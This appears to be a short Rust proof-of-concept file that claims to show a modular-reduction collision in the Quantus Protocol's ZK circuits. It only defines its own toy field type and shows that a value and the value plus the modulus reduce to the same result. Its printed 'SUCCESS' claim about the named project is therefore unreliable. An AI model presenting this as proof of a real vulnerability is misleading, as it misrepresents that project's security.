// PoC: Modular Reduction Collision (u128 to Fp)
// Target: Quantus Protocol - qp-zk-circuits vulnerability demonstration

#[derive(Debug, Clone, PartialEq, Eq)]
struct Fp {
    value: u128,
    modulus: u128,
}

impl Fp {
    fn new(val: u128, modulus: u128) -> Self {
        Fp {
            value: val % modulus,
            modulus,
        }
    }
    fn from_u128(val: u128, modulus: u128) -> Self {
        Fp::new(val, modulus)
    }
}

fn main() {
    println!("[-] Initializing Quantus ZK Circuit PoC: Modular Reduction Test");
    let field_modulus: u128 = 340282366920938463463374607431768100000_u128;
    let legitimate_value: u128 = 123456789012345;

    let legitimate_fp = Fp::from_u128(legitimate_value, field_modulus);
    let crafted_value = legitimate_value.wrapping_add(field_modulus);
    let crafted_fp = Fp::from_u128(crafted_value, field_modulus);

    println!("Legitimate Fp: {:?}", legitimate_fp);
    println!("Crafted Fp:    {:?}", crafted_fp);

    assert_eq!(legitimate_fp, crafted_fp);
    println!("[!] SUCCESS: Exact Fp collision achieved via modular reduction.");
}
